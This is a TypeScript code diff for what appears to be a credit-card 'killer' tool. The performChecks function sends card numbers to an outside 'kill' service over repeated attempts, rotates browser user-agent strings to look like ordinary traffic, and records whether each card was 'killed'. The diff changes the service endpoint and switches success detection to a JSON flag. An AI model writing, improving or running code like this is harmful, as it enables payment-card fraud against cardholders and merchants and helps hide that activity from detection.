@@ -72,9 +72,9 @@ const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
 ];
 
-// Determine status from API response - only "KILLED SUCCESSFULLY" means killed
-const getStatusFromResponse = (responseText: string): "killed" | "unknown" => {
-  if (responseText.includes("KILLED SUCCESSFULLY")) {
+// Determine status from API response - "success": true means killed
+const getStatusFromResponse = (responseData: any): "killed" | "unknown" => {
+  if (responseData && responseData.success === true) {
     return "killed";
   }
   return "unknown";
@@ -89,7 +89,7 @@ const performChecks = async (cc: string): Promise<{
   errorCount: number;
   totalTime: string;
 }> => {
-  const apiUrl = `https://killer-2-gates-pyjk.vercel.app/ko/cc=${cc}?key=anmokupvttt`;
+  const apiUrl = `https://killer-edbu.onrender.com/kill?cc=${cc}`;
   const attempts: { attempt: number; status: string; response: string; time: string }[] = [];
   let isKilled = false;
   const startTime = Date.now();
@@ -114,9 +114,16 @@ const performChecks = async (cc: string): Promise<{
 
       const rawText = await response.text();
       const attemptTime = ((Date.now() - attemptStart) / 1000).toFixed(2);
-      console.log(`[KILLER-AUTH] Attempt ${i} response: ${rawText.substring(0, 100)}`);
+      console.log(`[KILLER-AUTH] Attempt ${i} response: ${rawText.substring(0, 200)}`);
 
-      const attemptKilled = rawText.includes("KILLED SUCCESSFULLY");
+      let attemptKilled = false;
+      try {
+        const jsonData = JSON.parse(rawText);
+        attemptKilled = jsonData.success === true;
+      } catch {
+        attemptKilled = false;
+      }
+
       if (attemptKilled) {
         isKilled = true;
       }
